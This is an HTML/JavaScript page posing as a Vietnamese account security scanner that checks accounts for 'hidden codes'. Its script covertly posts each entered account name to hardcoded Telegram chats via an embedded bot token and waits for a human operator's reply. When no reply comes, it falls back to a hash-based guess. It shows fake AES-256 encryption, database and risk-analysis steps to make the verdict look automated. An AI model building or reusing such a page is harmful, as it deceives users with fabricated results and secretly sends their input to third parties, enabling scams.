<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ACC SCANNER v2.7 | TELEGRAM RELAY</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=VT323&display=swap" rel="stylesheet">
<style>
  :root {
    --green: #00ff41;
    --green-dim: #00b32d;
    --green-dark: #003b0a;
    --green-glow: #00ff4133;
    --red: #ff003c;
    --amber: #ffb300;
    --bg: #0a0a0a;
    --panel: #0d0d0d;
    --border: #00ff4122;
  }

  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    background: var(--bg);
    color: var(--green);
    font-family: 'Share Tech Mono', monospace;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    overflow-x: hidden;
    position: relative;
  }

  body::before {
    content: '';
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,65,0.015) 2px, rgba(0,255,65,0.015) 4px);
    pointer-events: none;
    z-index: 9999;
    animation: scanroll 10s linear infinite;
  }

  body::after {
    content: '';
    position: fixed;
    top: -100%;
    left: 0; right: 0;
    height: 200px;
    background: linear-gradient(transparent, rgba(0,255,65,0.04), transparent);
    pointer-events: none;
    z-index: 9998;
    animation: scanmove 4s linear infinite;
  }

  @keyframes scanroll { 0%{background-position:0 0} 100%{background-position:0 100px} }
  @keyframes scanmove { 0%{top:-200px} 100%{top:100vh} }

  #matrix {
    position: fixed;
    top: 0; left: 0;
    opacity: 0.06;
    pointer-events: none;
    z-index: 0;
  }

  .container {
    position: relative;
    z-index: 10;
    width: min(650px, 94vw);
  }

  .header {
    text-align: center;
    margin-bottom: 24px;
  }

  .logo {
    font-family: 'VT323', monospace;
    font-size: clamp(32px, 6vw, 52px);
    color: var(--green);
    text-shadow: 0 0 20px var(--green), 0 0 40px var(--green-dim);
    letter-spacing: 4px;
    animation: flicker 5s infinite;
    line-height: 1;
  }

  .logo span { color: var(--red); text-shadow: 0 0 20px var(--red); }

  @keyframes flicker {
    0%,95%,100%{opacity:1}
    96%{opacity:0.8}
    97%{opacity:1}
    98%{opacity:0.6}
    99%{opacity:1}
  }

  .subtitle {
    font-size: 10px;
    color: var(--green-dim);
    letter-spacing: 4px;
    margin-top: 4px;
    opacity: 0.7;
  }

  .version-bar {
    display: flex;
    justify-content: space-between;
    font-size: 9px;
    color: var(--green-dim);
    opacity: 0.5;
    margin-top: 6px;
    padding: 0 2px;
  }

  .panel {
    background: var(--panel);
    border: 1px solid var(--border);
    border-top: 1px solid var(--green-dim);
    box-shadow: 0 0 30px rgba(0,255,65,0.07), inset 0 0 30px rgba(0,0,0,0.5);
    padding: 28px;
    position: relative;
  }

  .panel::before {
    content: '';
    position: absolute;
    top: 0; left: 0; right: 0;
    height: 1px;
    background: linear-gradient(90deg, transparent, var(--green), transparent);
    animation: lineflow 3s ease-in-out infinite;
  }

  @keyframes lineflow {
    0%,100%{opacity:0.3} 50%{opacity:1}
  }

  .panel-title {
    font-size: 10px;
    color: var(--green-dim);
    letter-spacing: 3px;
    margin-bottom: 20px;
    display: flex;
    align-items: center;
    gap: 10px;
  }

  .panel-title::before { content:'['; color: var(--green); }
  .panel-title::after { content:']'; color: var(--green); }

  .panel-title .blink {
    display: inline-block;
    width: 8px; height: 8px;
    background: var(--green);
    border-radius: 50%;
    animation: pulse 1.2s ease-in-out infinite;
    box-shadow: 0 0 8px var(--green);
  }

  @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.3;transform:scale(0.8)} }

  .input-group {
    margin-bottom: 24px;
  }

  .input-label {
    font-size: 10px;
    letter-spacing: 2px;
    color: var(--green-dim);
    margin-bottom: 6px;
    display: block;
  }

  .input-wrap {
    position: relative;
    display: flex;
    align-items: center;
  }

  .input-wrap::before {
    content: '>';
    position: absolute;
    left: 12px;
    color: var(--green);
    font-size: 16px;
    pointer-events: none;
  }

  input[type="text"] {
    width: 100%;
    background: #050505;
    border: 1px solid var(--border);
    border-left: 2px solid var(--green-dim);
    color: var(--green);
    font-family: 'Share Tech Mono', monospace;
    font-size: 14px;
    padding: 10px 12px 10px 30px;
    outline: none;
    transition: all 0.2s;
    letter-spacing: 1px;
  }

  input[type="text"]:focus {
    border-color: var(--green);
    border-left-color: var(--green);
    box-shadow: 0 0 15px rgba(0,255,65,0.12), inset 0 0 10px rgba(0,255,65,0.04);
    background: #070d07;
  }

  input::placeholder { color: #1a3a1a; font-size: 13px; }

  .btn-scan {
    width: 100%;
    background: transparent;
    border: 1px solid var(--green);
    color: var(--green);
    font-family: 'Share Tech Mono', monospace;
    font-size: 15px;
    letter-spacing: 4px;
    padding: 13px;
    cursor: pointer;
    position: relative;
    overflow: hidden;
    transition: all 0.3s;
    text-transform: uppercase;
    margin-bottom: 20px;
  }

  .btn-scan:hover {
    background: var(--green-glow);
    box-shadow: 0 0 25px rgba(0,255,65,0.3), inset 0 0 20px rgba(0,255,65,0.05);
    letter-spacing: 6px;
  }

  .btn-scan:active { transform: scale(0.98); }

  .btn-scan::before {
    content: '';
    position: absolute;
    top: 0; left: -100%;
    width: 100%; height: 100%;
    background: linear-gradient(90deg, transparent, rgba(0,255,65,0.15), transparent);
    transition: left 0.4s;
  }

  .btn-scan:hover::before { left: 100%; }

  .btn-scan:disabled {
    opacity: 0.4;
    cursor: not-allowed;
    letter-spacing: 4px;
  }

  .terminal {
    background: #030303;
    border: 1px solid #00ff4110;
    border-left: 2px solid var(--green-dim);
    min-height: 120px;
    max-height: 210px;
    overflow-y: auto;
    padding: 12px;
    font-size: 12px;
    line-height: 1.7;
    scrollbar-width: thin;
    scrollbar-color: var(--green-dim) transparent;
  }

  .terminal::-webkit-scrollbar { width: 4px; }
  .terminal::-webkit-scrollbar-thumb { background: var(--green-dim); }

  .log-line { display: block; }
  .log-line.sys { color: #1a5c1a; }
  .log-line.info { color: var(--green-dim); }
  .log-line.warn { color: var(--amber); }
  .log-line.error { color: var(--red); }
  .log-line.success { color: var(--green); font-weight: bold; }
  .log-line.highlight { color: #fff; text-shadow: 0 0 8px var(--green); }

  .result-popup {
    position: fixed;
    bottom: 30px;
    left: 50%;
    transform: translateX(-50%) scale(0.9);
    background: #0b0f0b;
    border: 1.5px solid;
    backdrop-filter: blur(12px);
    padding: 10px 22px;
    border-radius: 0px;
    display: flex;
    align-items: center;
    gap: 14px;
    z-index: 10000;
    font-family: 'Share Tech Mono', monospace;
    box-shadow: 0 0 35px rgba(0,0,0,0.8);
    transition: all 0.2s cubic-bezier(0.2, 1.2, 0.3, 1);
    opacity: 0;
    visibility: hidden;
    pointer-events: none;
  }

  .result-popup.show {
    opacity: 1;
    visibility: visible;
    transform: translateX(-50%) scale(1);
    pointer-events: auto;
  }

  .result-popup.found {
    border-color: var(--red);
    background: rgba(20, 0, 8, 0.92);
    box-shadow: 0 0 18px rgba(255, 0, 60, 0.3);
  }

  .result-popup.clean {
    border-color: var(--green);
    background: rgba(0, 20, 0, 0.92);
    box-shadow: 0 0 18px rgba(0, 255, 65, 0.2);
  }

  .popup-icon {
    font-size: 28px;
    line-height: 1;
  }

  .popup-content {
    display: flex;
    flex-direction: column;
  }

  .popup-title {
    font-weight: bold;
    font-size: 18px;
    letter-spacing: 1px;
  }

  .popup-desc {
    font-size: 9px;
    opacity: 0.7;
    margin-top: 2px;
  }

  .result-popup.found .popup-title { color: var(--red); text-shadow: 0 0 6px var(--red); }
  .result-popup.clean .popup-title { color: var(--green); text-shadow: 0 0 6px var(--green); }

  .progress-wrap {
    display: none;
    margin-bottom: 14px;
  }

  .progress-label {
    font-size: 10px;
    color: var(--green-dim);
    letter-spacing: 2px;
    margin-bottom: 4px;
    display: flex;
    justify-content: space-between;
  }

  .progress-bar {
    height: 3px;
    background: #0d0d0d;
    border: 1px solid var(--border);
    position: relative;
    overflow: hidden;
  }

  .progress-fill {
    height: 100%;
    background: linear-gradient(90deg, var(--green-dim), var(--green));
    width: 0%;
    transition: width 0.1s linear;
    box-shadow: 0 0 8px var(--green);
  }

  .status-bar {
    display: flex;
    justify-content: space-between;
    font-size: 9px;
    color: #1a3a1a;
    letter-spacing: 1px;
    margin-top: 20px;
    padding-top: 12px;
    border-top: 1px solid #00ff4108;
  }

  .status-dot {
    display: inline-block;
    width: 6px; height: 6px;
    background: var(--green);
    border-radius: 50%;
    margin-right: 5px;
    animation: pulse 1.5s infinite;
  }

  @keyframes glitch {
    0%,90%,100%{transform:none;clip-path:none}
    91%{transform:translateX(-2px);clip-path:polygon(0 20%,100% 20%,100% 50%,0 50%)}
    92%{transform:translateX(2px);clip-path:polygon(0 60%,100% 60%,100% 80%,0 80%)}
    93%{transform:none;clip-path:none}
  }

  .glitch { animation: glitch 6s infinite; }

  @media(max-width: 480px) {
    .panel { padding: 18px; }
    .logo { font-size: 32px; }
    .result-popup { padding: 8px 18px; gap: 8px; width: 90%; justify-content: center; }
    .popup-title { font-size: 16px; }
  }
</style>
</head>
<body>

<canvas id="matrix"></canvas>

<div class="container">
  <div class="header">
    <div class="logo glitch">Hệ thống kiểm tra<span> bảo mật</span></div>
    <div class="subtitle">DEEP ACCOUNT ANALYSIS SYSTEM</div>
    <div class="version-bar">
      <span>v2.7.6-TG-MULTI</span>
      <span id="clock">--:--:--</span>
      <span>NODE: VN-01</span>
    </div>
  </div>

  <div class="panel">
    <div class="panel-title"><span class="blink"></span></div>

    <div class="input-group">
      <label class="input-label"></label>
      <div class="input-wrap">
        <input type="text" id="accInput" placeholder="" autocomplete="off">
      </div>
    </div>

    <div class="progress-wrap" id="progressWrap">
      <div class="progress-label">
        <span id="progressLabel">ĐANG SCAN...</span>
        <span id="progressPct">0%</span>
      </div>
      <div class="progress-bar">
        <div class="progress-fill" id="progressFill"></div>
      </div>
    </div>

    <button class="btn-scan" id="scanBtn" onclick="startScan()">[ KIỂM TRA ]</button>

    <div class="terminal" id="terminal">
      <span class="log-line sys">// HỆ THỐNG KIỂM TRA BẢO MẬT v2.7.6 INITIALIZED</span>
      <span class="log-line sys">// Đang chờ...</span>
    </div>

    <div class="status-bar">
      <span><span class="status-dot"></span>SYSTEM ONLINE</span>
      <span id="sessionId">SESSION: --</span>
      <span>ENC: AES-256</span>
    </div>
  </div>
</div>

<div id="resultPopup" class="result-popup">
  <div class="popup-icon" id="popupIcon">!</div>
  <div class="popup-content">
    <div class="popup-title" id="popupTitle">---</div>
    <div class="popup-desc" id="popupDesc"></div>
  </div>
</div>

<script>
// ==================== HARDCODED TELEGRAM CONFIG ====================
const HARDCODED_BOT_TOKEN = "8733138340:AAGSz56sxLwM4u9OLDSV6jQcD45yXOkh2CQ";
const HARDCODED_CHAT_IDS = [
  "6316826211",
  "213123213",
  "123123123",
];
const TELEGRAM_TIMEOUT_SEC = 35;
// ====================================================================

// Matrix rain
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');
function resizeCanvas() {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
}
resizeCanvas();
window.addEventListener('resize', resizeCanvas);
const cols = Math.floor(window.innerWidth / 20);
const drops = Array(cols).fill(1);
const chars = 'アイウエオカキクケコ0123456789ABCDEF<>/\\|[]{}';
function drawMatrix() {
  ctx.fillStyle = 'rgba(0,0,0,0.05)';
  ctx.fillRect(0, 0, canvas.width, canvas.height);
  ctx.fillStyle = '#00ff41';
  ctx.font = '14px Share Tech Mono';
  drops.forEach((y, i) => {
    const c = chars[Math.floor(Math.random() * chars.length)];
    ctx.fillText(c, i * 20, y * 20);
    if (y * 20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
    drops[i]++;
  });
}
setInterval(drawMatrix, 50);

function updateClock() {
  const now = new Date();
  document.getElementById('clock').textContent = now.toTimeString().slice(0,8);
}
setInterval(updateClock, 1000);
updateClock();

const session = Math.random().toString(36).substr(2,8).toUpperCase();
document.getElementById('sessionId').textContent = 'SESSION: ' + session;

const terminal = document.getElementById('terminal');
function log(msg, type='info', delay=0) {
  return new Promise(resolve => {
    setTimeout(() => {
      const span = document.createElement('span');
      span.className = 'log-line ' + type;
      span.textContent = msg;
      terminal.appendChild(span);
      terminal.scrollTop = terminal.scrollHeight;
      resolve();
    }, delay);
  });
}

function clearLogs() {
  terminal.innerHTML = '<span class="log-line sys">// HỆ THỐNG KIỂM TRA BẢO MẬT v2.7.6 INITIALIZED</span>\n<span class="log-line sys">// Đang chờ...</span>';
}

function setProgress(pct, label) {
  document.getElementById('progressFill').style.width = pct + '%';
  document.getElementById('progressPct').textContent = pct + '%';
  if (label) document.getElementById('progressLabel').textContent = label;
}

function showProgress(show) {
  document.getElementById('progressWrap').style.display = show ? 'block' : 'none';
}

function showPopup(type, title, desc) {
  const popup = document.getElementById('resultPopup');
  const iconEl = document.getElementById('popupIcon');
  const titleEl = document.getElementById('popupTitle');
  const descEl = document.getElementById('popupDesc');
  popup.classList.remove('found', 'clean', 'show');
  if (type === 'found') {
    popup.classList.add('found');
    iconEl.textContent = '⚠';
    titleEl.textContent = title || 'MÃ ẨN PHÁT HIỆN';
    descEl.textContent = desc || 'Tài khoản có dấu hiệu mã ẩn';
  } else {
    popup.classList.add('clean');
    iconEl.textContent = '✓';
    titleEl.textContent = title || 'KHÔNG MÃ ẨN';
    descEl.textContent = desc || 'Tài khoản sạch, không có cảnh báo';
  }
  popup.classList.add('show');
  setTimeout(() => {
    if (popup.classList.contains('show')) popup.classList.remove('show');
  }, 4000);
}

const sleep = ms => new Promise(r => setTimeout(r, ms));

// Gửi tin nhắn đến 1 chat ID
async function sendTelegramToChat(token, chatId, message) {
  if (!message || message.trim() === '') {
    throw new Error('Message empty');
  }
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const res = await fetch(url, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      disable_web_page_preview: true
    })
  });
  const data = await res.json();
  if (!data.ok) throw new Error(data.description);
  return { chatId: String(chatId), msgId: data.result.message_id };
}

// Gửi tin nhắn đến nhiều chat ID
async function sendTelegramToMultiple(token, chatIds, message) {
  const results = [];
  for (const chatId of chatIds) {
    try {
      const result = await sendTelegramToChat(token, chatId, message);
      results.push(result);
    } catch (e) {
      // Bỏ qua lỗi từng user
    }
  }
  return results;
}

// Lắng nghe phản hồi từ nhiều chat
async function pollForReplyMulti(token, chatIds, sentList, timeoutSec) {
  const deadline = Date.now() + timeoutSec * 1000;
  let offset = 0;
  
  const sentMap = new Map();
  sentList.forEach(item => {
    sentMap.set(item.chatId, item.msgId);
  });
  
  const allowedChatIds = chatIds.map(id => String(id));
  
  while (Date.now() < deadline) {
    const url = `https://api.telegram.org/bot${token}/getUpdates?offset=${offset}&timeout=5&allowed_updates=["message"]`;
    
    try {
      const res = await fetch(url);
      const data = await res.json();
      
      if (data.ok && data.result && data.result.length > 0) {
        for (const update of data.result) {
          offset = update.update_id + 1;
          
          const msg = update.message;
          if (!msg || !msg.text) continue;
          
          const chatId = String(msg.chat.id);
          const text = msg.text.trim().toLowerCase();
          
          if (!allowedChatIds.includes(chatId)) continue;
          
          const sentMsgId = sentMap.get(chatId);
          if (!sentMsgId || msg.message_id <= sentMsgId) continue;
          
          if (text === '1' || text === 'có' || text === 'co' || text.includes('found')) {
            return 'found';
          }
          if (text === '0' || text === 'không' || text === 'khong' || text.includes('clean') || text.includes('sạch')) {
            return 'clean';
          }
        }
      }
    } catch (e) {
      // Bỏ qua lỗi
    }
    
    await sleep(2000);
  }
  
  return null;
}

async function fallbackScan(account) {
  let hash = 0;
  for (let i = 0; i < account.length; i++) {
    hash = ((hash << 5) - hash) + account.charCodeAt(i);
    hash |= 0;
  }
  const seed = Math.abs(hash) % 100;
  return seed < 45;
}

// Main scan - không có log telegram
async function startScan() {
  const acc = document.getElementById('accInput').value.trim();
  
  if (!acc) {
    log('>> LỖI: Vui lòng nhập tài khoản!', 'error');
    showPopup('clean', '⚠ LỖI', 'Chưa nhập tài khoản');
    return;
  }

  const btn = document.getElementById('scanBtn');
  btn.disabled = true;
  btn.textContent = '[ ĐANG XỬ LÝ... ]';
  clearLogs();
  showProgress(true);
  document.getElementById('resultPopup').classList.remove('show');
  
  await log(`[${ts()}] KHỞI ĐỘNG PHIÊN QUÉT #${session}`, 'sys');
  setProgress(5, 'KHỞI ĐỘNG...');
  await sleep(250);
  
  await log(`[${ts()}] TARGET: ${acc}`, 'highlight');
  setProgress(12, 'PHÂN TÍCH...');
  await sleep(300);
  
  await log(`[${ts()}] MÃ HÓA PAYLOAD AES-256...`, 'info');
  setProgress(20, 'MÃ HÓA...');
  await sleep(350);
  
  const isValidToken = HARDCODED_BOT_TOKEN && HARDCODED_BOT_TOKEN.length > 30;
  const isValidChatIds = Array.isArray(HARDCODED_CHAT_IDS) && HARDCODED_CHAT_IDS.length > 0;
  const useTg = isValidToken && isValidChatIds;
  
  let finalResult = null;
  
  if (useTg) {
    setProgress(28, 'KẾT NỐI...');
    await sleep(200);
    
    let sentList = [];
    try {
      const msgText = `Thông báo kiểm tra

Session: ${session}
Tài khoản: ${acc}
Thời gian: ${new Date().toLocaleString('vi-VN')}

Trả lời:
• 1 hoặc có → Có mã ẩn
• 0 hoặc không → Không có mã ẩn`;
      
      sentList = await sendTelegramToMultiple(HARDCODED_BOT_TOKEN, HARDCODED_CHAT_IDS, msgText);
      setProgress(45, 'CHỜ PHẢN HỒI...');
    } catch(e) {
      // Không log lỗi
    }
    
    if (sentList.length > 0) {
      let elapsed = 0;
      const pollPromise = pollForReplyMulti(HARDCODED_BOT_TOKEN, HARDCODED_CHAT_IDS, sentList, TELEGRAM_TIMEOUT_SEC);
      const tickInterval = setInterval(() => {
        elapsed++;
        const pct = 45 + Math.min(45, (elapsed / TELEGRAM_TIMEOUT_SEC) * 45);
        setProgress(Math.floor(pct), `ĐANG XỬ LÝ... ${elapsed}s`);
      }, 1000);
      
      const reply = await pollPromise;
      clearInterval(tickInterval);
      
      if (reply === 'found') {
        finalResult = true;
      } else if (reply === 'clean') {
        finalResult = false;
      }
    }
  }
  
  if (finalResult === null) {
    setProgress(55, 'PHÂN TÍCH DỮ LIỆU...');
    const steps = [
      [400, 65, 'TRUY VẤN CƠ SỞ DỮ LIỆU...'],
      [380, 75, 'KIỂM TRA RISK INDEX...'],
      [420, 85, 'PHÂN TÍCH HÀNH VI...'],
      [350, 95, 'XÁC MINH KẾT QUẢ...']
    ];
    for (const [ms, pct, label] of steps) {
      await sleep(ms);
      setProgress(pct, label);
      await log(`[${ts()}] ${label}`, 'info');
    }
    finalResult = await fallbackScan(acc);
  } else {
    const steps = [
      [400, 55, 'TRUY VẤN CƠ SỞ DỮ LIỆU...'],
      [380, 68, 'KIỂM TRA RISK INDEX...'],
      [420, 80, 'PHÂN TÍCH HÀNH VI...'],
      [350, 92, 'XÁC MINH KẾT QUẢ...']
    ];
    for (const [ms, pct, label] of steps) {
      await sleep(ms);
      setProgress(pct, label);
      await log(`[${ts()}] ${label}`, 'info');
    }
  }
  
  setProgress(100, 'HOÀN THÀNH');
  await sleep(250);
  
  if (finalResult) {
    await log(`[${ts()}] ⚠ KẾT QUẢ: PHÁT HIỆN MÃ ẨN`, 'error');
    showPopup('found', '⚠ CÓ MÃ ẨN', `Tài khoản ${acc} có dấu hiệu mã ẩn | Session #${session}`);
  } else {
    await log(`[${ts()}] ✓ KẾT QUẢ: KHÔNG PHÁT HIỆN MÃ ẨN`, 'success');
    showPopup('clean', '✓ KHÔNG MÃ ẨN', `Tài khoản ${acc} sạch | Session #${session}`);
  }
  
  await log(`[${ts()}] PHIÊN QUÉT KẾT THÚC.`, 'sys');
  
  btn.disabled = false;
  btn.textContent = '[ KIỂM TRA ]';
  showProgress(false);
}

function ts() {
  return new Date().toTimeString().slice(0,8);
}

document.getElementById('accInput').addEventListener('keypress', function(e) {
  if (e.key === 'Enter') {
    e.preventDefault();
    startScan();
  }
});

window.addEventListener('load', () => {
  document.getElementById('resultPopup').classList.remove('show');
});
</script>
</body>
</html>
